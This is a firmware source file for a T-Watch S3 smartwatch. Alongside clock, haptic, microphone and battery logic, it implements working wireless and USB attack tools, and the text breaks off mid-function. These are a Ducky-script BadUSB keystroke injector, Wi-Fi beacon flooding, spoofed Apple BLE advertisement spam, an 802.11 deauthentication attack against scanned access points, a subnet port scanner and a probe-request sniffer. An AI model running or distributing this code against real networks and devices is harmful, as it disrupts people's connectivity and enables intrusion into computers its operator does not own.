// --- Logic.cpp ---
#include "Logic.h"
#include "Globals.h"
#include "Display.h" 
#include "SensorDriver.h"
#include "PortalServer.h"
#include "AppLauncher.h" 
#include "HardwareConfig.h" 
#include "NotificationManager.h"
#include "LoraManager.h"
#include "AppManager.h"
#include <esp_sleep.h>
#include <driver/i2s.h>
#include <BLEDevice.h>
#include <WiFi.h>      
#include <esp_wifi.h> 

#define TOUCH_INT 16 // HIER IST DER FIX: Pin für den Touch-Wakeup definiert!

extern "C" {
    typedef uint8_t esp_bd_addr_t[6];
    int esp_ble_gap_set_rand_addr(esp_bd_addr_t rand_addr);
}

extern void toggleWLAN();
extern void startHotspotAP();
extern void stopHotspotAP();
extern void toggleUsbHid();
extern void playSynthSound(int type, int duration);

bool badUsbActive = false;
bool wifiSpamActive = false;
bool bleSpamActive = false;

void showToast(String msg, int duration) { toastMsg = msg; toastEndTime = millis() + duration; toastColor = 0x2945; lastSecond = -1; }
void showToastColor(String msg, int duration, uint16_t col) { toastMsg = msg; toastEndTime = millis() + duration; toastColor = col; lastSecond = -1; }
void triggerVibration() { if (vibActive) { drv.selectLibrary(1); drv.setMode(HapticMode::INTERNAL_TRIGGER); drv.setWaveform(0, hapticWaveform); drv.setWaveform(1, 0); drv.run(); } }
void triggerAlarm() { for(int i=0; i<4; i++) { if(timerAlarmMode == 0 || timerAlarmMode == 2) { drv.selectLibrary(1); drv.setMode(HapticMode::INTERNAL_TRIGGER); drv.setWaveform(0, 47); drv.setWaveform(1, 0); drv.run(); } if(timerAlarmMode == 1 || timerAlarmMode == 2) { playSynthSound(6, 200); } delay(400); } }

void killAllApps() { 
    swRunning = false; swElapsed = 0; timerRunning = false; timerRemaining = 0; stopMic(); jigglerActive = false;
    badUsbActive = false; wifiSpamActive = false; bleSpamActive = false;
    nmapActive = false; deauthActive = false;
    diceRolling = false;
    AppManager::stopAllJsApps();
    if (probeMonActive) stopProbeMonitor();
    if (bleScanActive) stopBleScan();
    
    if (deauthState > 0 || nmapState > 0) {
        esp_wifi_set_promiscuous(false);
        if (!wlanActive && !evilActive) {
            WiFi.disconnect(true);
            WiFi.mode(WIFI_OFF);
        }
        deauthState = 0; nmapState = 0;
    }
}

void killSecurityTasks() {
    duckyActive = false; wifiSpamActive = false; bleSpamActive = false;
    nmapActive = false; deauthActive = false;
    if (probeMonActive) stopProbeMonitor();
    if (bleScanActive) stopBleScan();
    if (portalActive) { togglePortalServer(); }
    if (deauthState > 0 || nmapState > 0) {
        esp_wifi_set_promiscuous(false);
        if (!wlanActive && !portalActive) {
            WiFi.disconnect(true);
            WiFi.mode(WIFI_OFF);
        }
        deauthState = 0; nmapState = 0;
    }
}

void toggleBT() { btActive = !btActive; if (btActive) { if (!bleInitDone) { BLEDevice::init("T-Watch S3"); bleInitDone = true; } delay(300); showToast("Bluetooth An", 3500); } else { if (bleInitDone) { BLEDevice::deinit(true); bleInitDone = false; } delay(300); showToast("Bluetooth Aus", 3500); } }
void toggleVibra() { vibActive = !vibActive; prefs.begin("clock", false); prefs.putBool("vib", vibActive); prefs.end(); if (vibActive) triggerVibration(); showToast(vibActive ? "Vibration An" : "Vibration Aus", 3500); }

void startMic() { if(micActive) return; i2s_start(I2S_NUM_0); micActive = true; }
void stopMic() { if(!micActive) return; i2s_stop(I2S_NUM_0); micActive = false; debug_rms = 0.0; }
int getDecibels() {
    if(!micActive) return 0; 
    
    // Stereo-Buffer lesen (L+R interleaved, wir brauchen nur L)
    size_t bytes_read = 0; 
    int16_t i2s_read_buff[1024]; 
    esp_err_t err = i2s_read(I2S_NUM_0, (void*)i2s_read_buff, sizeof(i2s_read_buff), &bytes_read, 50 / portTICK_PERIOD_MS);
    if (err != ESP_OK || bytes_read == 0) { debug_rms = -1.0; return 0; }
    
    int totalSamples = bytes_read / 2; // Gesamtzahl int16_t Werte (L,R,L,R,...)
    
    // Nur den linken Kanal extrahieren (jedes 2. Sample, Index 0, 2, 4, ...)
    int monoCount = 0;
    long sum = 0;
    for (int i = 0; i < totalSamples; i += 2) {
        sum += i2s_read_buff[i]; 
        monoCount++;
    }
    if (monoCount == 0) return 0;
    
    // 1. DC-Offset berechnen und entfernen
    int16_t dcOffset = sum / monoCount;
    
    // 2. RMS nur über den linken Kanal
    double rms = 0; 
    for (int i = 0; i < totalSamples; i += 2) { 
        double val = (double)(i2s_read_buff[i] - dcOffset); 
        rms += (val * val); 
    }
    rms = sqrt(rms / monoCount); 
    debug_rms = rms; 
    
    if (rms < 10.0) return 0; 
    
    // 3. dB SPL Berechnung kalibriert für T-Watch S3 PDM-Mic
    int db = (int)(20.0 * log10(rms / 30.0) + 30.0);
    if (db < 25) db = 25; 
    if (db > 120) db = 120; 
    
    // 4. Smoothing (70% neuer Wert, 30% alter) — schnell reaktiv, kein Flackern
    static int lastDb = 0;
    if (lastDb == 0) lastDb = db;
    db = (db * 7 + lastDb * 3) / 10;
    lastDb = db;
    
    return db;
}

String translateForLayout(String text, int layout) {
    if (layout == 0) return text; 
    String res = "";
    for(int i=0; i<text.length(); i++) {
        char c = text[i];
        switch(c) {
            case 'z': res += 'y'; break; case 'Z': res += 'Y'; break; case 'y': res += 'z'; break; case 'Y': res += 'Z'; break;
            case ':': res += '>'; break; case '/': res += '&'; break; case '?': res += '_'; break; case '=': res += ')'; break;
            case '-': res += '/'; break; case '_': res += '?'; break; case '&': res += '^'; break; case '*': res += '}'; break;
            case '(': res += '*'; break; case ')': res += '('; break; case '+': res += ']'; break;
            default: res += c; break;
        }
    }
    return res;
}

static int duckyIdx = 0;
static unsigned long duckyDelayUntil = 0;
static int duckyCurrentScript = -1;

void executeBadUSB() {
    if(!badUsbActive) {
        duckyIdx = 0;
        duckyDelayUntil = 0;
        duckyCurrentScript = -1;
        return;
    }

    if (millis() < duckyDelayUntil) {
        return;
    }

    if (duckyCurrentScript != currentBadUsbScript) {
        duckyCurrentScript = currentBadUsbScript;
        duckyIdx = 0;
        duckyDelayUntil = 0;
    }

    String scriptToRun = badUsbScripts[currentBadUsbScript];
    if (duckyIdx >= scriptToRun.length()) {
        badUsbActive = false;
        duckyIdx = 0;
        duckyDelayUntil = 0;
        duckyCurrentScript = -1;
        showToast("Ducky fertig!", 2500);
        lastSecond = -1;
        return;
    }

    int nextLine = scriptToRun.indexOf('\n', duckyIdx);
    if(nextLine == -1) nextLine = scriptToRun.length();
    String line = scriptToRun.substring(duckyIdx, nextLine);
    line.trim();
    duckyIdx = nextLine + 1;

    if (line.length() == 0) return; // Leere Zeile überspringen

    if (line.startsWith("DELAY ")) {
        int d = line.substring(6).toInt();
        duckyDelayUntil = millis() + d;
        return;
    }
    else if (line.startsWith("STRING ")) {
        String payload = line.substring(7);
        payload = translateForLayout(payload, badUsbLayout);
        Keyboard.print(payload);
        duckyDelayUntil = millis() + 40;
    }
    else if (line.startsWith("GUI ")) {
        Keyboard.press(KEY_LEFT_GUI);
        if(line.length() > 4) Keyboard.press(line[4]);
        delay(20);
        Keyboard.releaseAll();
        duckyDelayUntil = millis() + 60;
    }
    else if (line == "ENTER") { Keyboard.write(KEY_RETURN); duckyDelayUntil = millis() + 40; }
    else if (line == "TAB") { Keyboard.write(KEY_TAB); duckyDelayUntil = millis() + 30; }
    else if (line == "ESCAPE" || line == "ESC") { Keyboard.write(KEY_ESC); duckyDelayUntil = millis() + 30; }
    else if (line == "BACKSPACE") { Keyboard.write(KEY_BACKSPACE); duckyDelayUntil = millis() + 30; }
    else if (line == "DELETE") { Keyboard.write(KEY_DELETE); duckyDelayUntil = millis() + 30; }
    else if (line == "INSERT") { Keyboard.write(KEY_INSERT); duckyDelayUntil = millis() + 30; }
    else if (line == "HOME") { Keyboard.write(KEY_HOME); duckyDelayUntil = millis() + 30; }
    else if (line == "END") { Keyboard.write(KEY_END); duckyDelayUntil = millis() + 30; }
    else if (line == "PAGEUP") { Keyboard.write(KEY_PAGE_UP); duckyDelayUntil = millis() + 30; }
    else if (line == "PAGEDOWN") { Keyboard.write(KEY_PAGE_DOWN); duckyDelayUntil = millis() + 30; }
    else if (line == "UPARROW" || line == "UP") { Keyboard.write(KEY_UP_ARROW); duckyDelayUntil = millis() + 30; }
    else if (line == "DOWNARROW" || line == "DOWN") { Keyboard.write(KEY_DOWN_ARROW); duckyDelayUntil = millis() + 30; }
    else if (line == "LEFTARROW" || line == "LEFT") { Keyboard.write(KEY_LEFT_ARROW); duckyDelayUntil = millis() + 30; }
    else if (line == "RIGHTARROW" || line == "RIGHT") { Keyboard.write(KEY_RIGHT_ARROW); duckyDelayUntil = millis() + 30; }
    else if (line == "SPACE") { Keyboard.write(' '); duckyDelayUntil = millis() + 30; }
    else if (line == "PRINTSCREEN") { Keyboard.write(KEY_PRINT_SCREEN); duckyDelayUntil = millis() + 30; }
    else if (line == "CAPSLOCK") { Keyboard.write(KEY_CAPS_LOCK); duckyDelayUntil = millis() + 30; }
    else if (line.startsWith("F") && line.length() <= 3 && line.substring(1).toInt() >= 1 && line.substring(1).toInt() <= 12) {
        int fn = line.substring(1).toInt();
        Keyboard.write(KEY_F1 + fn - 1);
        duckyDelayUntil = millis() + 40;
    }
    else if (line.startsWith("ALT ")) {
        Keyboard.press(KEY_LEFT_ALT);
        if(line.length() > 4) Keyboard.press(line[4]);
        delay(20);
        Keyboard.releaseAll();
        duckyDelayUntil = millis() + 60;
    }
    else if (line.startsWith("CTRL ") || line.startsWith("CONTROL ")) { 
        int sp = line.indexOf(' '); String rest = line.substring(sp + 1); rest.trim();
        Keyboard.press(KEY_LEFT_CTRL); 
        if (rest.length() == 1) Keyboard.press(rest[0]); 
        delay(20);
        Keyboard.releaseAll();
        duckyDelayUntil = millis() + 60;
    }
    else if (line.startsWith("SHIFT ")) {
        Keyboard.press(KEY_LEFT_SHIFT);
        if(line.length() > 6) Keyboard.press(line[6]);
        delay(20);
        Keyboard.releaseAll();
        duckyDelayUntil = millis() + 60;
    }
    else if (line.startsWith("ALT+TAB")) {
        Keyboard.press(KEY_LEFT_ALT);
        Keyboard.press(KEY_TAB);
        delay(20);
        Keyboard.releaseAll();
        duckyDelayUntil = millis() + 60;
    }
    else if (line.startsWith("CTRL+ALT ")) { 
        Keyboard.press(KEY_LEFT_CTRL);
        Keyboard.press(KEY_LEFT_ALT);
        if(line.length() > 9) Keyboard.press(line[9]); 
        delay(20);
        Keyboard.releaseAll();
        duckyDelayUntil = millis() + 60;
    }
}

void spamBeacons() {
    if(!wifiSpamActive) return;
    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x31, 0x04, 0x00, 0x00 };
    String ssids[10]; int count = 0; int start = 0;
    for(int i=0; i<spamSSIDs.length(); i++) {
        if(spamSSIDs[i] == ',' || i == spamSSIDs.length()-1) {
            if(i == spamSSIDs.length()-1) ssids[count] = spamSSIDs.substring(start);
            else ssids[count] = spamSSIDs.substring(start, i);
            ssids[count].trim(); count++; start = i+1; if(count >= 10) break;
        }
    }
    if(count == 0) return;

    for(int j=0; j<5; j++) { 
        for(int i=0; i<count; i++) {
            if(!wifiSpamActive) return;
            packet[10] = packet[16] = random(256); packet[11] = packet[17] = random(256); packet[12] = packet[18] = random(256);
            packet[13] = packet[19] = random(256); packet[14] = packet[20] = random(256); packet[15] = packet[21] = random(256);
            int ssidLen = ssids[i].length(); if(ssidLen > 32) ssidLen = 32; packet[37] = ssidLen; 
            for(int k=0; k<ssidLen; k++) packet[38+k] = ssids[i][k];
            packet[38+ssidLen] = 0x01; packet[39+ssidLen] = 0x08; packet[40+ssidLen] = 0x82; packet[41+ssidLen] = 0x84; packet[42+ssidLen] = 0x8b; packet[43+ssidLen] = 0x96; packet[44+ssidLen] = 0x24; packet[45+ssidLen] = 0x30; packet[46+ssidLen] = 0x48; packet[47+ssidLen] = 0x6c;
            esp_wifi_80211_tx(WIFI_IF_AP, packet, 48 + ssidLen, false);
            delay(5);
        }
    }
}

void spamBLE() {
    if (!bleSpamActive) return;
    static unsigned long lastBleSpam = 0;
    if (millis() - lastBleSpam < 100) return; 
    lastBleSpam = millis();

    if (!bleInitDone) { BLEDevice::init("T-Watch"); bleInitDone = true; }

    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

    uint8_t payload[] = {
        0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x0e, 0x02, 0x20, 0x75,
        0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    const uint8_t models[] = {0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14}; 
    payload[6] = models[random(sizeof(models))];
    
    oAdvertisementData.addData((char*)payload, sizeof(payload)); 
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
}

void scanAir() {
    if(!isScanningAir) return;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    int n = WiFi.scanNetworks(false, false, false, 300);
    numScannedNetworks = 0;
    for (int i = 0; i < n && i < 15; i++) {
        scannedSSIDs[i] = WiFi.SSID(i);
        scannedMACs[i] = WiFi.BSSIDstr(i);
        numScannedNetworks++;
    }
    isScanningAir = false;
    WiFi.scanDelete();
    currentDeauthTarget = 0;
    lastSecond = -1;
}

void executeDeauth() {
    if (!deauthActive) { deauthState = 0; return; }
    
    if (deauthState == 0) {
        if(numScannedNetworks == 0) { deauthActive = false; return; }
        String bssidStr = scannedMACs[currentDeauthTarget];
        char* ptr;
        deauthMac[0] = strtol(bssidStr.substring(0, 2).c_str(), &ptr, 16);
        deauthMac[1] = strtol(bssidStr.substring(3, 5).c_str(), &ptr, 16);
        deauthMac[2] = strtol(bssidStr.substring(6, 8).c_str(), &ptr, 16);
        deauthMac[3] = strtol(bssidStr.substring(9, 11).c_str(), &ptr, 16);
        deauthMac[4] = strtol(bssidStr.substring(12, 14).c_str(), &ptr, 16);
        deauthMac[5] = strtol(bssidStr.substring(15, 17).c_str(), &ptr, 16);
        
        deauthState = 2; 
        WiFi.mode(WIFI_AP); 
        esp_wifi_set_promiscuous(true);
        lastSecond = -1;
    } else if (deauthState == 2) {
        uint8_t deauth_pkt[26] = {
            0xc0, 0x00, 0x00, 0x00, 
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
            deauthMac[0], deauthMac[1], deauthMac[2], deauthMac[3], deauthMac[4], deauthMac[5], 
            deauthMac[0], deauthMac[1], deauthMac[2], deauthMac[3], deauthMac[4], deauthMac[5], 
            0x00, 0x00, 
            0x07, 0x00 
        };
        for(int i=0; i<30; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_pkt, sizeof(deauth_pkt), false);
            delay(2);
        }
    }
}

void executeNmap() {
    if (!nmapActive) { nmapState = 0; return; }

    // Port-Liste als Funktions-Static, damit ein neuer Scan sie neu parsen kann.
    static int ports[10]; static int portCount = 0;

    if (nmapState == 0) {
        portCount = 0;
        nmapCurrentPort = 0;
        nmapLog = "Verbinde mit " + targetSSIDs[currentTargetNmap] + "...\n";
        WiFi.mode(WIFI_STA);
        WiFi.begin(targetSSIDs[currentTargetNmap].c_str(), targetPWDs[currentTargetNmap].c_str());
        nmapState = 1;
        lastSecond = -1;
    } 
    else if (nmapState == 1) {
        if (WiFi.status() == WL_CONNECTED) {
            nmapLog += "Verbunden!\nLokal: " + WiFi.localIP().toString() + "\nScanne...\n";
            nmapIP = 1;
            nmapCurrentPort = 0;
            nmapState = 2;
            lastSecond = -1;
        } else if (WiFi.status() == WL_CONNECT_FAILED || WiFi.status() == WL_NO_SSID_AVAIL) {
            nmapLog += "Fehler: WLAN nicht gefunden\noder PW falsch!\n";
            nmapState = 4;
            nmapActive = false;
            lastSecond = -1;
        }
    } 
    else if (nmapState == 2) {
        static unsigned long lastTick = 0;
        if (millis() - lastTick < 25) return; 
        lastTick = millis();

        // Parse ports from nmapPorts string
        if (portCount == 0) {
            String tmp = nmapPorts; int pi = 0;
            while (tmp.length() > 0 && pi < 10) {
                int sep = tmp.indexOf(',');
                if (sep == -1) { ports[pi++] = tmp.toInt(); break; }
                ports[pi++] = tmp.substring(0, sep).toInt(); tmp = tmp.substring(sep + 1);
            }
            portCount = max(1, pi);
            nmapCurrentPort = 0;
        }

        if (nmapIP > 254) {
            nmapLog += "Scan beendet.\n";
            nmapState = 3;
            nmapActive = false;
            portCount = 0;
            nmapCurrentPort = 0;
            if (!wlanActive && !evilActive) {
                WiFi.disconnect(true);
                WiFi.mode(WIFI_OFF);
            }
            lastSecond = -1;
            return;
        }

        IPAddress base;
        if (base.fromString(nmapBaseIP + "1")) {
            IPAddress target(base[0], base[1], base[2], nmapIP);
            if (target != WiFi.localIP() && nmapCurrentPort < portCount) {
                WiFiClient client;
                if (client.connect(target, ports[nmapCurrentPort], 35)) { 
                    nmapLog += "+ " + target.toString() + ":" + String(ports[nmapCurrentPort]) + " Offen\n";
                    client.stop();
                    lastSecond = -1;
                }
                nmapCurrentPort++;
                if (nmapCurrentPort >= portCount) {
                    nmapCurrentPort = 0;
                    nmapIP++;
                }
                return;
            }
        }
        nmapCurrentPort = 0;
        nmapIP++;
    }
}

// ---------------------------------------------------------
// WiFi Probe Request Monitor (Promiscuous Mode)
// ---------------------------------------------------------

// ISR-safe ring buffer for probe data (no heap allocation in callback!)
#define PROBE_RING_SIZE 8
static volatile int probeRingHead = 0;
static volatile int probeRingTail = 0;
static char probeRingMac[PROBE_RING_SIZE][18];
static char probeRingSSID[PROBE_RING_SIZE][33];
static volatile int probeRingRssi[PROBE_RING_SIZE];

static void probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* frame = pkt->payload;
    // Probe Request = subtype 0x04 (bits 4-7 of byte 0)
    if ((frame[0] & 0xF0) != 0x40) return;

    int nextHead = (probeRingHead + 1) % PROBE_RING_SIZE;
    if (nextHead == probeRingTail) return; // ring full, drop

    // Extract source MAC (offset 10)
    snprintf(probeRingMac[probeRingHead], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);

    // Extract SSID from tagged parameters (offset 24+)
    probeRingSSID[probeRingHead][0] = '\0';
    if (pkt->rx_ctrl.sig_len > 26) {
        int pos = 24;
        while (pos < (int)pkt->rx_ctrl.sig_len - 2) {
            uint8_t tagNum = frame[pos];
            uint8_t tagLen = frame[pos + 1];
            if (tagNum == 0 && tagLen > 0 && tagLen < 33) {
                memcpy(probeRingSSID[probeRingHead], &frame[pos + 2], tagLen);
                probeRingSSID[probeRingHead][tagLen] = '\0';
                break;
            }
            pos += 2 + tagLen;
            if (tagLen == 0) break;
        }
    }
    if (probeRingSSID[probeRingHead][0] == '\0') {
        memcpy(probeRingSSID[probeRingHead], "(Broadcast)", 12);
    }

    probeRingRssi[probeRingHead] = pkt->rx_ctrl.rssi;
    probeRingHead = nextHead; // publish
}

// Called from main loop to drain ring buffer into String arrays safely
void processProbeRing() {
    while (probeRingTail != probeRingHead) {
        String mac = String(probeRingMac[probeRingTail]);
        String ssid = String(probeRingSSID[probeRingTail]);
        int rssi = probeRingRssi[probeRingTail];
        probeRingTail = (probeRingTail + 1) % PROBE_RING_SIZE;

        // Check for duplicate MAC
        bool found = false;
        for (int i = 0; i < probeCount; i++) {
            if (probeMacs[i] == mac) {
                probeSSIDs[i] = ssid;
                probeRSSI[i] = rssi;
                found = true;
                break;
            }
        }
        if (!found && probeCount < MAX_PROBES) {
            probeMacs[probeCount] = mac;
            probeSSIDs[probeCount] = ssid;
            probeRSSI[probeCount] = rssi;
            probeCount++;
            lastSecond = -1;
        }
    }
}

void startProbeMonitor() {
    probeCount = 0;
    probeScrollOffset = 0;
    probeMonActive = true;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    esp_wifi_set_promiscuous_rx_cb(probeSnifferCallback);
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt;
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filt);
    lastSecond = -1;
}

void stopProbeMonitor() {
    probeMonActive = false;
    esp_wifi_set_promiscuous(false);
    if (!wlanActive && !evilActive) {
        WiFi.mode(WIFI_OFF);
    }
    lastSecond = -1;
}

// ---------------------------------------------------------
// BLE Scanner (Lock-Free SPSC Ring Buffer for BTC_TASK -> Main Loop)
// ---------------------------------------------------------
#define BLE_RING_SIZE 8
static volatile int bleRingHead = 0;
static volatile int bleRingTail = 0;
static char bleRingMac[BLE_RING_SIZE][18];
static char bleRingName[BLE_RING_SIZE][33];
static volatile int bleRingRssi[BLE_RING_SIZE];
static volatile bool bleRingHasName[BLE_RING_SIZE];

class BleScanCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
        int nextHead = (bleRingHead + 1) % BLE_RING_SIZE;
        if (nextHead == bleRingTail) return; // ring full, drop

        strncpy(bleRingMac[bleRingHead], advertisedDevice.getAddress().toString().c_str(), 17);
        bleRingMac[bleRingHead][17] = '\0';
        for (int i = 0; bleRingMac[bleRingHead][i]; i++) {
            bleRingMac[bleRingHead][i] = (char)toupper((unsigned char)bleRingMac[bleRingHead][i]);
        }

        bleRingRssi[bleRingHead] = advertisedDevice.getRSSI();
        if (advertisedDevice.haveName()) {
            strncpy(bleRingName[bleRingHead], advertisedDevice.getName().c_str(), 32);
            bleRingName[bleRingHead][32] = '\0';
            bleRingHasName[bleRingHead] = true;
        } else {
            bleRingName[bleRingHead][0] = '\0';
            bleRingHasName[bleRingHead] = false;
        }
        bleRingHead = nextHead;
    }
};

static void processBleRing() {
    while (bleRingTail != bleRingHead) {
        String mac = String(bleRingMac[bleRingTail]);
        int rssi = bleRingRssi[bleRingTail];
        bool hasName = bleRingHasName[bleRingTail];
        String name = hasName ? String(bleRingName[bleRingTail]) : "(Unknown)";
        bleRingTail = (bleRingTail + 1) % BLE_RING_SIZE;

        bool found = false;
        for (int i = 0; i < bleScanCount; i++) {
            if (bleScanMacs[i] == mac) {
                bleScanRssi[i] = rssi;
                if (hasName) bleScanNames[i] = name;
                found = true;
                break;
            }
        }
        if (!found && bleScanCount < MAX_BLE_RESULTS) {
            bleScanMacs[bleScanCount] = mac;
            bleScanRssi[bleScanCount] = rssi;
            bleScanNames[bleScanCount] = name;
            bleScanCount++;
            lastSecond = -1;
        }
    }
}

static BleScanCallbacks bleScanCb;

void startBleScan() {
    bleScanCount = 0;
    bleScanScrollOffset = 0;
    bleRingHead = 0;
    bleRingTail = 0;
    bleScanActive = true;
    if (!bleInitDone) { BLEDevice::init("T-Watch S3"); bleInitDone = true; }
    BLEScan* pScan = BLEDevice::getScan();
    pScan->setAdvertisedDeviceCallbacks(&bleScanCb, true);
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);
    pScan->start(0, nullptr, false); // continuous scan
    lastSecond = -1;
}

void stopBleScan() {
    bleScanActive = false;
    if (bleInitDone) {
        BLEDevice::getScan()->stop();
        if (!btActive) { BLEDevice::deinit(true); bleInitDone = false; }
    }
    lastSecond = -1;
}

void checkBackgroundTasks(unsigned long currentMillis) {
    if (probeMonActive) processProbeRing(); // drain ISR ring buffer safely
    if (bleScanActive) processBleRing();    // drain BLE task ring buffer safely
    // Mikrofon (I2S RX) an die Dezibel-Seite koppeln.
    AppPackage* curApp = AppManager::getAppByPage(currentPage);
    String curTid = curApp ? (curApp->driver.length() > 0 ? curApp->driver : curApp->id) : "";
    if (curTid == "mic") { if (!micActive) startMic(); }
    else if (micActive) { stopMic(); }
    updateMotion(currentMillis); // Schrittzähler + Handgelenk-Wake (BMA423)
    refreshPowerTelemetry(false);

    // Automatischer Hintergrund-NTP-Sync, wenn mit einem Heim-WLAN verbunden
    static unsigned long lastNtpAutoSync = 0;
    if (wlanActive && wlanClientMode && WiFi.status() == WL_CONNECTED) {
        if (lastNtpAutoSync == 0 || (currentMillis - lastNtpAutoSync > 1800000UL)) {
            lastNtpAutoSync = currentMillis;
            syncNtpTime(6);
        }
    } else {
        lastNtpAutoSync = 0;
    }

    bool isCharging = isChargingCached(false);
    if (isCharging && !wasCharging) { 
        wasCharging = true; 
        showToastColor("Wird geladen ⚡", 3500, 0x07E0); 
        if (!wlanActive && !evilActive) {
            startHotspotAP();
        }
        if (hotspotPromptActive) {
            hotspotPromptActive = false; // Zurueck am Strom -> Abfrage beenden
        }
    } else if (!isCharging && wasCharging) { 
        wasCharging = false; 
        showToastColor("Akku-Modus 🔋", 3000, 0x07E0);
        lastSecond = -1;
    }

    // Am Strom sicherstellen, dass Hotspot dauerhaft laeuft
    if (isCharging && !wlanActive && !evilActive) {
        startHotspotAP();
    }
    AppPackage* tmApp = AppManager::getAppById("timer");
    bool timerIsJs = (tmApp && AppManager::hasJsScript(tmApp));
    if (!timerIsJs && timerRunning && (currentMillis - timerLastTick >= 1000)) {
        timerRemaining--;
        timerLastTick = currentMillis;
        if (timerRemaining <= 0) {
            timerRunning = false;
            timerRemaining = 0;
            triggerAlarm();
            lastSecond = -1;
            lastTouchTime = currentMillis;
            showToastColor("Timer abgelaufen! ⏱️", 6000, 0xFD20);
        }
    }

    static unsigned long lastJiggle = 0; 
    if (jigglerActive && currentMillis - lastJiggle > 15000) { Mouse.move(2, 2); Mouse.move(-2, -2); lastJiggle = currentMillis; }

    // Hintergrund-Ticks fuer dynamische JS-Apps (z.B. Timer, Stoppuhr, Jiggler)
    AppManager::tickBackgroundApps(currentMillis);

    // WICHTIG: Normales WLAN (wlanActive) zaehlt NICHT als Hacking-Modus!
    bool hacksRunning = (jigglerActive || badUsbActive || wifiSpamActive || bleSpamActive || deauthActive || nmapActive || evilActive || probeMonActive || bleScanActive);

    if (badUsbActive) executeBadUSB();
    if (wifiSpamActive) spamBeacons();
    if (bleSpamActive) spamBLE(); 
    if (deauthActive) executeDeauth();
    if (nmapActive) executeNmap();
    if (isScanningAir) scanAir();

    if (matrixMode) {
        lastTouchTime = currentMillis; setBrightness(maxBright); int16_t mx[2], my[2];
        if (touch.getPoint(mx, my, 1) > 0) { matrixMode = false; tft.fillScreen(cBG); lastSecond = -1; return; }
        static unsigned long lastMatrixUpdate = 0;
        if (currentMillis - lastMatrixUpdate > 40) {
            lastMatrixUpdate = currentMillis;
            for(int i=0; i<24; i++) {
                 if (matrixY[i] == 0 && random(10) > 2) continue; 
                 tft.fillRect(i*10, matrixY[i] - 42, 10, 14, TFT_BLACK); tft.setTextColor(0x03E0, TFT_BLACK); 
                 tft.drawChar((char)random(33, 126), i*10, matrixY[i] - 14, 2); tft.drawChar((char)random(33, 126), i*10, matrixY[i] - 28, 2); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawChar((char)random(33, 126), i*10, matrixY[i], 2);
                 matrixY[i] += 14; if(matrixY[i] > 282) matrixY[i] = 0; 
            }
        }
        return; 
    }

    if (currentMillis - lastHistoryTime >= historyInterval || historyCount == 0) {
        bool hadPrevSample = historyCount > 0;
        uint16_t prevRaw = hadPrevSample ? batHistoryPct[historyCount - 1] : 0;

        lastHistoryTime = currentMillis;
        uint16_t batVal = (uint16_t)constrain(getBattery(), 0, 100);
        if (isCharging) batVal = max((uint16_t)1, batVal) + 200;
        else if (hacksRunning) batVal = max((uint16_t)1, batVal) + 100;

        if (historyCount < MAX_HISTORY) { batHistoryPct[historyCount] = batVal; historyCount++; }
        else { for(int i = 1; i < MAX_HISTORY; i++) batHistoryPct[i-1] = batHistoryPct[i]; batHistoryPct[MAX_HISTORY-1] = batVal; }

        // Adaptive Restdauer-Schaetzung: bleibt der Modus ueber ein Sample-Intervall gleich,
        // fliesst die beobachtete %/h-Rate per EMA in den gelernten Erfahrungswert dieses Modus ein.
        static int battLearnWriteCounter = 0;
        bool learnedThisTick = false;
        if (hadPrevSample) {
            int prevMode = battRawMode(prevRaw), curMode = battRawMode(batVal);
            if (prevMode == curMode) {
                int prevPct = battRawPct(prevRaw), curPct = battRawPct(batVal);
                int delta = curMode == 2 ? (curPct - prevPct) : (prevPct - curPct); // Laden=Gewinn, sonst Verlust
                if (delta > 0 && delta <= 25) { // Ausreisser durch Messfehler ignorieren
                    float ratePerHour = (float)delta * (3600000.0f / (float)historyInterval);
                    const float alpha = 0.15f;
                    if (curMode == 2) { battRateCharging += alpha * (ratePerHour - battRateCharging); if (battSamplesCharging < 60000) battSamplesCharging++; }
                    else if (curMode == 1) { battRateHacking += alpha * (ratePerHour - battRateHacking); if (battSamplesHacking < 60000) battSamplesHacking++; }
                    else { battRateNormal += alpha * (ratePerHour - battRateNormal); if (battSamplesNormal < 60000) battSamplesNormal++; }
                    learnedThisTick = true;
                }
            }
        }
        if (learnedThisTick) {
            battLearnWriteCounter++;
            if (battLearnWriteCounter >= 5) { // wie bei hData: seltener schreiben, NVS schonen
                battLearnWriteCounter = 0;
                prefs.begin("clock", false);
                prefs.putFloat("bRateN", battRateNormal); prefs.putFloat("bRateH", battRateHacking); prefs.putFloat("bRateC", battRateCharging);
                prefs.putUShort("bSampN", battSamplesNormal); prefs.putUShort("bSampH", battSamplesHacking); prefs.putUShort("bSampC", battSamplesCharging);
                prefs.end();
            }
        }

